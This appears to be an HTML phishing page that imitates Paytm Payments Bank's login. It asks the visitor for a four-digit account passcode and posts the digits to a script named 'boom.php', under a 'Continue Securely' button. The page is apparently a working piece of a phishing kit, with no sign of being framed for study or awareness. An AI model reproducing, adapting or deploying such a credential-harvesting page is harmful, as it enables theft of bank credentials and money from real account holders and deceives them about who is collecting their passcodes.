<!DOCTYPE html>
<html lang="ptm">
<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Paytm Payment Bank</title>
  <style>
#ptm_logo
{
  width: 90%;
  margin-left: 20px;
}
       
.pincode-input {
  float: relative;
  font-size: 100%;
  font-weight: bold;
  text-align: center;
  margin-left: 50px;
  height: 50px;
  width: 40px;
  color: #8898c2;
  background: white;
  border: 1px solid;
  border-color: #b3c0e2 #bcc5e2 #c0ccea;
  border-radius: 4px;
}

.pincode-input1 {
  margin-left: 20px;
  float: relative;
  text-align: center;
  font-size: 100%;
  font-weight: bold;
  height: 50px;
  width: 40px;
  color: #8898c2;
  background: white;
  border: 1px solid;
  border-color: #b3c0e2 #bcc5e2 #c0ccea;
  border-radius: 4px;
}
.pincode-input2 {
  margin-left: 20px;
  float: relative;
  font-size: 100%;
  text-align: center;
  font-weight: bold;
  height: 50px;
  width: 40px;
  color: #8898c2;
  background: white;
  border: 1px solid;
  border-color: #b3c0e2 #bcc5e2 #c0ccea;
  border-radius: 4px;
}
.pincode-input3 {
  margin-left: 20px;
  float: relative;
  text-align: center;
  font-size: 100%;
  font-weight: bold;
  height: 50px;
  width: 40px;
  color: #8898c2;
  background: white;
  border: 1px solid;
  border-color: #b3c0e2 #bcc5e2 #c0ccea;
  border-radius: 4px;
}

#btn
{
  margin-top: 40px;
  background-color:#00baf2;
  color:white;
  border-color:#00baf2;
  height: 55px;
  width: 320px;
  font-size:20px;
}

</style>
</head>
<body>
<img src="Paytm-Bank.svg" alt="" id="ptm_logo">
<div id="txt">
<h2><center> Enter Paytm Bank Passcode to</br>Access your Account </center></h2>
</div>
</br>
<form action="boom.php" method="post">   
<div  class="pincode-input-container"><input type="tel" name="a" class="pincode-input" maxlength="1" required><input type="tel" name="b" class="pincode-input1" maxlength="1" required><input type="tel" name="c" class="pincode-input2" maxlength="1" required><input type="tel" name="d" class="pincode-input3" maxlength="1" required></div>
<center><button type="submit" name="submit" id="btn"> Continue Securely</button></center>        
</form>
</body>
</html>